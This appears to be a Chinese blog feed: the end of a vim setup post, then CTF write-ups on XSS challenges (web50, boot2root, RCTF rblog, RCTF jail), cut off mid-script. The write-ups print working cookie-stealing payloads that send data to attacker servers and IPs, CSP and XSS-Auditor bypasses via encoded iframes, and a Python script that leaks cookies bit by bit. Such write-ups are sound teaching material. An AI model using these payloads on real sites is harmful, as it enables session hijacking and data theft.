<h4 id="vim-plugset-keysound-vim"><a href="#vim-plugset-keysound-vim" class="headerlink" title="~/.vim/plugset/keysound.vim"></a>~/.vim/plugset/keysound.vim</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;launch with vim</span><br><span class="line">let g:keysound_enable = 1</span><br><span class="line"></span><br><span class="line">&quot;set default sound</span><br><span class="line">let g:keysound_theme = &apos;default&apos;</span><br><span class="line">&quot; let g:keysound_theme = &apos;typewriter&apos;</span><br><span class="line">&quot; let g:keysound_theme = &apos;sword&apos;</span><br><span class="line">&quot; let g:keysound_theme = &apos;mario&apos;</span><br><span class="line">&quot; let g:keysound_theme = &apos;bubble&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot; set python version</span><br><span class="line">let g:keysound_py_version = 2</span><br><span class="line"></span><br><span class="line">&quot;volumn setting</span><br><span class="line">&quot; 其实设置这么大,早就超过极限了</span><br><span class="line">let g:keysound_volumn = 100000</span><br></pre></td></tr></table></figure>

<h3 id="vim-plugset-taglists-vim"><a href="#vim-plugset-taglists-vim" class="headerlink" title="~/.vim/plugset/taglists.vim"></a>~/.vim/plugset/taglists.vim</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">map &lt;leader&gt;t :TlistToggle&lt;CR&gt; &quot;设置召唤键</span><br><span class="line">let Tlist_WinWidth=30        &quot;设置taglist宽度</span><br><span class="line">let Tlist_Exit_OnlyWindow=1  &quot;tagList窗口是最后一个窗口，则退出Vim</span><br><span class="line">let Tlist_Use_Right_Window   = 0</span><br><span class="line"></span><br><span class="line">&quot; 不同时显示多个文件的 tag ，只显示当前文件的</span><br><span class="line"></span><br><span class="line">&quot; let Tlist_Show_One_File=1</span><br><span class="line"></span><br><span class="line">&quot;让当前不被编辑的文件的方法列表自动折叠起来</span><br><span class="line"></span><br><span class="line">let Tlist_File_Fold_Auto_Close=1</span><br></pre></td></tr></table></figure>

<h3 id="vim-plugset-bookmark-vim"><a href="#vim-plugset-bookmark-vim" class="headerlink" title="~/.vim/plugset/bookmark.vim"></a>~/.vim/plugset/bookmark.vim</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let g:bookmark_sign = &apos;&gt;&gt;&apos;</span><br><span class="line">let g:bookmark_highlight_lines = 1</span><br><span class="line">&quot; unmap mp</span><br><span class="line">nmap mN &lt;Plug&gt;BookmarkPrev</span><br></pre></td></tr></table></figure>

<h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install ctags</span><br><span class="line">#切到待审计文件夹下的根目录下,执行</span><br><span class="line">ctags -R</span><br><span class="line">生成全局的标签文件</span><br><span class="line">然后我们进入一个代码文件,光标放在某一个函数名或者是宏上,按下Ctrl + ], vim就可以自动切换到该函数定义处,要返回只需要按下Ctrl + o  或者 Ctrl + t</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install xcape</span><br><span class="line"># make CapsLock behave like Ctrl:</span><br><span class="line">setxkbmap -option ctrl:nocaps</span><br><span class="line"># make short-pressed Ctrl behave like Escape:</span><br><span class="line">xcape -e &apos;Control_L=Escape&apos;</span><br></pre></td></tr></table></figure>

<p>see the link below:</p>
<p><a href="http://tiborsimko.org/capslock-escape-control.html" target="_blank" rel="noopener">http://tiborsimko.org/capslock-escape-control.html</a></p>
<p>由于这样的做法会让caplock反应变慢,因此我不用这种方法,而是传统的修改keyboard文件来达到简单的esc映射效果.</p>
]]></content>
      <categories>
        <category>闲来无事</category>
      </categories>
  </entry>
  <entry>
    <title>XSS 题型记录</title>
    <url>/2019/04/22/XSS%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p>这个题目主要考察了XSS攻击，其中攻击的思路很有<code>ssrf</code>的味道。<br>首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。<br>然后有两个选项<code>profile</code>和<code>report bug</code>，前者记录了我们的账户信息。</p>
<p>后者包含了一个文本框，提交一些东西之后显示<code>admin will take a look, blah blah, you know what it means</code>，可以推测我们<code>上传的东西都会被管理员查看</code>，那么存在<code>client-attack</code>，最有可能是xss攻击了。</p>
<p>然后在几个地方尝试XSS注入，发现上传的文件中可以传入xss脚本，并且可以执行，验证脚本如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">-----------------------------18467633426500</span><br><span class="line">Content-Disposition: form-data; name="avatar"; filename="fu.svg"</span><br><span class="line">Content-Type: image/svg+xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      alert(<span class="string">'XSS!'</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">-----------------------------18467633426500--</span><br></pre></td></tr></table></figure>

<p>在发送之后。我们要把上传文件的<code>url</code>通过<code>report bug</code>上传给管理员。<br>注意<code>content-type后面需要空一行，content-type的类型也要声明成image/svg+xml</code>，通过访问回显出来的图片url可以发现执行成功。</p>
<p>下一步尝试将拿admin的<code>cookie</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">-----------------------------18467633426500</span><br><span class="line">Content-Disposition: form-data; name="avatar"; filename="fu.svg"</span><br><span class="line">Content-Type: image/svg+xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.open(<span class="string">"http://207.148.64.125:1234/?$&#123;document.cookie&#125;"</span>)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">-----------------------------18467633426500--</span><br></pre></td></tr></table></figure>

<p>然后服务器上开nc服务监听。但是并没有东西回显，很有可能是因为<code>httponly</code>的缘故。<code>在httponly下，js是无法操作cookie的</code>。</p>
<p>但是还有一个方法，管理员在访问我们上传的东西的时候，我们的脚本可以让他去访问他自己的profile，而且在访问的时候肯定是携带自己的cookie的，那么我们可以在脚本中将他访问之后得到的内容直接发送到我们自己的服务器上，这样绕过了cookie安全策略.(<code>原本常规做法是先获取cookie然后亲自去访问profile的,但是这次我们直接让admin自己去访问profile,省却了获取cookie的环节</code>)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">      xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">          xhr2.open(<span class="string">"POST"</span>, <span class="string">"http://url:port/"</span>);</span></span><br><span class="line">          xhr2.send(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;   </span><br><span class="line"><span class="javascript">      xhr.open(<span class="string">"GET"</span>, <span class="string">"http://web50.zajebistyc.tf/profile/admin"</span>);</span></span><br><span class="line"><span class="javascript">      xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">      xhr.send();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的<code>url:port</code>推荐使用<code>burpsuite</code>的<code>burpcollaborator</code>，但是我的炸了，所以选择使用自己的服务器，使用<code>nc -lvvkp 1234</code>来监听信息。如果一次不行可以再重来一下，我试了两次就出来了flag。</p>
<p><img src="http://ww1.sinaimg.cn/large/0062HBMaly1g1bi9k6pfbj30tk0j7aan.jpg" alt></p>
<blockquote>
<p>关于这道题目的一点思考:</p>
<p>经过搜索, 我发现XMLHttprequest默认情况下允许向不同源发送请求, 但是同源策略会阻止读取响应内容, 这似乎并不重要, 重要的是我们的请求是否可以将我们想要发送的httponly-cookie发送出去, 在web前端黑客技术揭秘这本书中,提到了,如果要带上会话信息来发送请求, 就要设置withCredentials的值为true.</p>
<p>设置HttpOnly属性，Cookie盗窃的威胁并没有彻底消除，因为cookie还是有可能传递的过程中被监听捕获后信息泄漏, 在这道题中就是这样.</p>
</blockquote>
<h2 id="eXquisite-Scenery-Sites-boot2root"><a href="#eXquisite-Scenery-Sites-boot2root" class="headerlink" title="eXquisite Scenery Sites(boot2root)"></a>eXquisite Scenery Sites(boot2root)</h2><p>这是一道xss题目，注入点在<code>username</code>上面，有长度限制<code>80</code>字符，过滤关键字：<code>scipt</code>和<code>.</code>，<code>script</code>大小写绕过，原来的<code>document.cookie</code>改写成<code>document[&#39;cookie&#39;]</code>，<br>将<code>ip地址转化为长整数类型</code>，省略http来节省长度空间。最终payload如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user=1&amp;Message=&lt;scriPt&gt;document[&apos;location&apos;]=&apos;//3482599549:8/?&apos;%2bdocument[&apos;cookie&apos;];&lt;/sCript&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Rctf-rblog"><a href="#Rctf-rblog" class="headerlink" title="Rctf rblog"></a>Rctf rblog</h2><p>点击查看网页源代码，发现<code>rblog.js</code> ，进入看看，里面提供了一个<code>/api/v2/posts</code> 。</p>
<p>访问之后把<code>posts</code> 换成其他的东西，发现<code>v2/</code>后面的内容会以字符串形式呈现，并在字符串的开头加上了斜杆。尝试<a href="http://rblog.2019.rctf.rois.io/api/v2/aaaaa" target="_blank" rel="noopener">http://rblog.2019.rctf.rois.io/api/v2/aaaaa</a><img>  或者是其他的标签来验证是否存在反射性XSS，但是并没有解析 ，在<code>header</code> 部分如下：</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58318343-24b48200-7e4a-11e9-9bed-625dfb6ef869.png" alt="image"></p>
<p>返回的数据依旧是<code>application/json</code> 说明图片标签并没有被解析。</p>
<p>然后需要一点脑洞，或者搜索能力，<code>v2</code> 是版本号，那么换成<code>v1</code> 访问试一试。同样测试是否存在反射XSS 漏洞 ： <a href="https://rblog.2019.rctf.rois.io/api/v1/" target="_blank" rel="noopener">https://rblog.2019.rctf.rois.io/api/v1/</a><img>，这次返回如下</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58318897-46facf80-7e4b-11e9-9702-87e89cf4afbe.png" alt="image"></p>
<p>看，<code>&lt;img&gt;</code> 作为<code>html</code> 标签解析了，但是还有<code>csp</code> 需要绕过</p>
<p><code>Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;</code> </p>
<p>然后看题目给的提示：</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; API supports JSONP.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>关于<code>JSONP</code> 和<code>callback</code> ，我看到了一段话，有助于理解：</p>
<blockquote>
<p>客户端把回调函数的名字传送给服务端，<br>然后服务端生成一段js代码且代码中包含着对回调函数的调用，<br>然后服务端把这段代码返回给客户端，<br>然后客户端执行这段代码的过程中调用了回调函数，<br>然后你就可以在回调函数里面处理数据了</p>
</blockquote>
<p>结合下面几个链接应该就可以弄懂了。</p>
<p><a href="https://www.zhihu.com/question/20235590" target="_blank" rel="noopener">https://www.zhihu.com/question/20235590</a></p>
<p><a href="http://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html" target="_blank" rel="noopener">http://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html</a></p>
<p><a href="https://juejin.im/entry/59f2f4ec518825411570156c" target="_blank" rel="noopener">https://juejin.im/entry/59f2f4ec518825411570156c</a></p>
<p>测试一下<code>https://rblog.2019.rctf.rois.io/api/v1/posts?callback=test</code>，返回：</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58321041-9c38e000-7e4f-11e9-805d-b0620180836c.png" alt="image"></p>
<p><code>callback</code> 后面的参数会包裹网页内容并呈现在网页上，那么就可以用反射型的XSS。</p>
<figure class="highlight plain"><figcaption><span>src</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58321250-3b5dd780-7e50-11e9-8fc2-fa4ff8d9a4ee.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可以看到斜杆被转义了。。。把``script``部分换成其他符号测试一下，发现``,`` ``&quot;`` ``/``也被转义了，选择``html``编码可以绕过。</span><br><span class="line"></span><br><span class="line">```&lt;iframe srcdoc=&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#114;&amp;#98;&amp;#108;&amp;#111;&amp;#103;&amp;#46;&amp;#50;&amp;#48;&amp;#49;&amp;#57;&amp;#46;&amp;#114;&amp;#99;&amp;#116;&amp;#102;&amp;#46;&amp;#114;&amp;#111;&amp;#105;&amp;#115;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#97;&amp;#112;&amp;#105;&amp;#47;&amp;#118;&amp;#49;&amp;#47;&amp;#112;&amp;#111;&amp;#115;&amp;#116;&amp;#115;&amp;#63;&amp;#99;&amp;#97;&amp;#108;&amp;#108;&amp;#98;&amp;#97;&amp;#99;&amp;#107;&amp;#61;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#59;&amp;#99;&amp;#111;&amp;#110;&amp;#115;&amp;#111;&amp;#108;&amp;#101;&amp;#46;&amp;#108;&amp;#111;&amp;#103;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&gt;</span><br></pre></td></tr></table></figure>

<p>内容是：</p>
<figure class="highlight plain"><figcaption><span>srcdoc</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">相当于把``alert(1);console.lot(XXXXXXXXXXX)`` 呈现在页面上之后把他们当做script脚本执行。当然，传入之前要先进行url编码，毕竟井号会被视为锚点。</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58365573-0063ae80-7ef9-11e9-94e9-7e1f6df04af7.png)</span><br><span class="line"></span><br><span class="line">在``firefox``行得通，但是在``chrome``下面会被拦截。</span><br><span class="line"></span><br><span class="line">关于``XSS-Auditor`` 我找到以下一段话：</span><br><span class="line"></span><br><span class="line">&gt; XSS Auditor takes a black list approach to identify dangerous characters and tags supplied in request parameters. It also attempts to match query parameters with content to identify injection points. If the query parameter can’t be matched to content in the response, the auditor will not be triggered. Because the browser will never have insight to server-side code, an application that mangles an XSS payload will always render the XSS auditor useless in preventing attacks.</span><br><span class="line"></span><br><span class="line">也就是说，如果后端对我们输入的url进行了某种处理的话，就可以导致url部分和页面内容部分不一致，从而构成对``XSS-auditor`` 的绕过。</span><br><span class="line"></span><br><span class="line">那么进行一波fuzz。发现中文符号（比如``￥`` ``·`` ``。`` ``，`` ）都会被转成类似于如下的形式</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58365956-1031c180-7efe-11e9-95a2-ed16f8970795.png)</span><br><span class="line"></span><br><span class="line">那么最后的payload就是：</span><br><span class="line"></span><br><span class="line">```https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc=(很多个中文句号)%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23114%3B%26%2398%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2349%3B%26%2357%3B%26%2346%3B%26%23114%3B%26%2399%3B%26%23116%3B%26%23102%3B%26%2346%3B%26%23114%3B%26%23111%3B%26%23105%3B%26%23115%3B%26%2346%3B%26%23105%3B%26%23111%3B%26%2347%3B%26%2397%3B%26%23112%3B%26%23105%3B%26%2347%3B%26%23118%3B%26%2349%3B%26%2347%3B%26%23112%3B%26%23111%3B%26%23115%3B%26%23116%3B%26%23115%3B%26%2363%3B%26%2399%3B%26%2397%3B%26%23108%3B%26%23108%3B%26%2398%3B%26%2397%3B%26%2399%3B%26%23107%3B%26%2361%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%2399%3B%26%2397%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B%26%2346%3B%26%23104%3B%26%23114%3B%26%23101%3B%26%23102%3B%26%2361%3B%26%2339%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23120%3B%26%23115%3B%26%23115%3B%26%2346%3B%26%23102%3B%26%2349%3B%26%23115%3B%26%23104%3B%26%2346%3B%26%23115%3B%26%23105%3B%26%23116%3B%26%23101%3B%26%2347%3B%26%2363%3B%26%2339%3B%26%2337%3B%26%2350%3B%26%2398%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2359%3B%26%2399%3B%26%23111%3B%26%23110%3B%26%23115%3B%26%23111%3B%26%23108%3B%26%23101%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2334%3B%26%2362%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%3E</span><br></pre></td></tr></table></figure>

<p>其中的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;https://rblog.2019.rctf.rois.io/api/v1/posts?callback=parent.location.href=&apos;http://xss.f1sh.site/?&apos;%2bdocument.cookie;console.log&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>将这部分进行html实体编码之后包裹进<code>&lt;iframe srcdoc=(很多中文句号){放置位置}&gt;</code>，然后进行整体url编码之后传入，就得到了flag。</p>
<h2 id="RCTF2019-jails-amp-password"><a href="#RCTF2019-jails-amp-password" class="headerlink" title="RCTF2019 jails &amp;password"></a>RCTF2019 jails &amp;password</h2><p><a href="https://xz.aliyun.com/t/5216" target="_blank" rel="noopener">https://xz.aliyun.com/t/5216</a></p>
<p><a href="https://github.com/nytr0gen/rctf-2019-writeups#jail" target="_blank" rel="noopener">https://github.com/nytr0gen/rctf-2019-writeups#jail</a></p>
<p><a href="https://github.com/liuhack/writeups/blob/master/2019/RCTF/jail/Readme.md" target="_blank" rel="noopener">https://github.com/liuhack/writeups/blob/master/2019/RCTF/jail/Readme.md</a></p>
<p><a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/jail%20%26%20password" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/jail%20%26%20password</a></p>
<p>Unexpected Solution</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(s, cipher)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> cipher == <span class="string">'sha1'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha1(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha224'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha224(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha256'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha256(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha384'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha384(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha512'</span>:</span><br><span class="line">       <span class="keyword">return</span> hashlib.sha512(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'md5'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(s).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">'cipher not found %s'</span> % cipher)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">hashes = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  return the breaking value </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_hash</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> hashes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hashes <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        exists = os.path.isfile(<span class="string">'hashes.marshal'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> exists:</span><br><span class="line">            hashes = &#123;&#125;</span><br><span class="line">            <span class="comment">#  generate a hash dictionary</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">10000000</span>):<span class="comment">#256**4):</span></span><br><span class="line">                s = str(i)</span><br><span class="line">                h = hash(s, cipher)</span><br><span class="line">                hashes[ h[<span class="number">0</span>:<span class="number">6</span>] ] = s</span><br><span class="line"></span><br><span class="line">                <span class="comment">#  0x0FFFFFFF</span></span><br><span class="line">                <span class="comment">#  print every 1048575 times</span></span><br><span class="line">                <span class="keyword">if</span> (i &amp; <span class="number">1048575</span>) == <span class="number">1048575</span>:</span><br><span class="line">                    print(<span class="string">'[*] hash loading at %s'</span> % s)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#  write it into file</span></span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'hashes.marshal'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                marshal.dump(hashes, f)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[*] loading lots of hashes'</span>)</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'hashes.marshal'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                hashes = marshal.load(f)</span><br><span class="line">            print(<span class="string">'[*] done loading'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> hashes:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'matching hash not found'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashes[key]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">req = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span><span class="params">(i=<span class="number">0</span>, j=<span class="number">0</span>, tries=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> req</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">1</span> &lt;= j &lt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt;= i</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt;= tries &lt;= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    cookies = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"a44a15e070b2d3c4adf9e951de241af3"</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> req <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># os.environ["HTTP_PROXY"] = "http://localhost:8080"</span></span><br><span class="line">        <span class="comment"># os.environ["HTTPS_PROXY"] = "http://localhost:8080"</span></span><br><span class="line"></span><br><span class="line">        req = requests.Session()</span><br><span class="line">        req.cookies.update(cookies)</span><br><span class="line">        req.verify = <span class="literal">False</span></span><br><span class="line">        req.allow_redirects = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    word = <span class="string">'retrying'</span> <span class="keyword">if</span> tries &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">'trying'</span></span><br><span class="line">    print(<span class="string">'[*] %s for i=%d j=%d'</span> % (word, i, j))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  what is 0x%08x ?</span></span><br><span class="line">    payload = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">i=0x%08x;</span></span><br><span class="line"><span class="string">j=0x%02x;</span></span><br><span class="line"><span class="string">v = document.cookie;</span></span><br><span class="line"><span class="string">s = v.charCodeAt(i).toString(2).padStart(8, '0')[j];</span></span><br><span class="line"><span class="string">document.cookie="PHPSESSID=%s";</span></span><br><span class="line"><span class="string">window.onload = function() &#123;</span></span><br><span class="line"><span class="string">method = null;</span></span><br><span class="line"><span class="string">if (s === '1') &#123;</span></span><br><span class="line"><span class="string">    method = 'delete';</span></span><br><span class="line"><span class="string">&#125; else if(s === '0') &#123;</span></span><br><span class="line"><span class="string">    method = 'logout';</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">    method = 'bad';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">document.write('&lt;img src="https://jail.2019.rctf.rois.io/?action=index&amp;method=' + method + '"&gt;');</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">"""</span> % (i, j, cookies[<span class="string">'PHPSESSID'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># submit post with payload</span></span><br><span class="line">    url = <span class="string">'https://jail.2019.rctf.rois.io/'</span></span><br><span class="line">    resp = req.post(url, data=&#123;<span class="string">"message"</span>: payload&#125;,  allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># login if not logged</span></span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">302</span>:</span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/?action=login'</span></span><br><span class="line">        data = &#123;<span class="string">"username"</span>: <span class="string">"leethacker"</span>, <span class="string">"password"</span>: <span class="string">"leethacker"</span>&#125;</span><br><span class="line">        resp = req.post(url, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># resend payload</span></span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/'</span></span><br><span class="line">        resp = req.post(url, data=&#123;<span class="string">"message"</span>: payload&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get post id</span></span><br><span class="line">    post_id = resp.text.split(<span class="string">'/?action=post&amp;id='</span>)[<span class="number">1</span>].split(<span class="string">'" target="'</span>)[<span class="number">0</span>].encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(<span class="string">"[*] post_id: %s"</span> % post_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># go to feedback page</span></span><br><span class="line">    url = <span class="string">'https://jail.2019.rctf.rois.io/?action=feedback'</span></span><br><span class="line">    resp = req.get(url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get proof of work</span></span><br><span class="line">    pow = resp.text.split(<span class="string">'Captcha: substr(md5(captcha), 0, 6) == "'</span>)[<span class="number">1</span>].split(<span class="string">'"&lt;/label&gt;'</span>)[<span 